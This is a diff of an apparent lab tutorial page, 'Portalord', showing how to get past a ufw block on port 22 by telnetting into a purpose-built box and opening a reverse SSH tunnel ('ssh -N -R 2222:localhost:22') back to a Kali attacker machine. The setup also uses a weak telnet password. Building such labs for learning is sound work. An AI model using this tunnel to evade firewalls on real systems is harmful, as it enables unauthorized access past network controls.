@@ -16,7 +16,7 @@ title: Portalord
 </div>
 
 ---
-# 1 remote ssh
+# Part 1: Remote ssh by binding highport to blocked port
 Use remote ssh to connect back to a localhost and get around ufw rules set up in the environment. This is helpful when firewall rules do not allow access to port 22 from the outside.
 
 
@@ -29,29 +29,39 @@ sudo ufw enable
 </div> 
 
 Turn password authentication on for the ssh-closed-box.
-#### `sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh`
+<div class="scroll-box">
+sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh
+</div> 
 
 Create a file that is only accessable to an ssh session by setting a "read only by owner" 
 <div class="scroll-box">
 echo "insert a flag here" > /home/ubuntu/ssh_flag.txt
 chmod 600 /home/ubuntu/ssh_flag.txt
 </div> 
+
 chmod permissions: Read (r=4), Write (w=2), Execute (x=1)
 
-first int is the owner
+- first int is the owner
 
-second int is the group
+- second int is the group
 
-third int is others
+- third int is others
 
 so 600 = 4+2 for the owner and 0 for group and 0 for everyone else
 
 Create a user that can only access telnet specific files
-#### `sudo adduser teluser`
+<div class="scroll-box">
+sudo adduser teluser
+</div>  
+
 - select a simple password (123)
 
 set limited permissions for teluser
-#### `sudo nano /usr/local/bin/telnet_shell.sh`
+
+<div class="scroll-box">
+sudo nano /usr/local/bin/telnet_shell.sh
+</div>  
+Put the following restrictions on the telnet users /bin/bash:
 <div class="scroll-box">
 #!/bin/bash
 echo "You have limited access."
@@ -65,28 +75,34 @@ install and open telnet services
 sudo apt update && sudo apt install telnetd -y && sudo apt install openbsd-inetd -y
 </div> 
 
-### On the attacker-box
+## On the attacker-box
 Install telnet if needed:
 <div class="scroll-box">
 sudo apt update && sudo apt install telnet -y
 </div>   
 
 Turn on your ability to reverse ssh with a password:
-#### `sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh`
+<div class="scroll-box">
+sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh
+</div>  
 
-now telnet into the ssh-closed-box
-#### `telnet x.x.x.x`
-
-now bind a local high port to local 22
-
+Now telnet into the ssh-closed-box
+<div class="scroll-box">
+telnet x.x.x.x`
+</div>  
+Now bind a local high port to local 22:
+<div class="scroll-box">
 ssh -N -R 2222:localhost:22 kali@your.kali.ip.addr.
-
+</div>  
 -N means --no-shell, -R means:--remote-port-forward
 
 If it appears to "hang" you have an open connection
 
 Now from a differnt terminal on you kali localhost
-####'ssh -p2222 ubuntu@ssh.closed.box.ip
+<div class="scroll-box">
+ssh -p2222 ubuntu@ssh.closed.box.ip
+</div>  
+What you are doing is connecting to your local port 2222, which has an open ssh session from the remote device. You are using that port 2222 to ssh to port 22 on the remote device which is only blocked at the firewall and not on the local machine. 
 
 go and find your flag
 
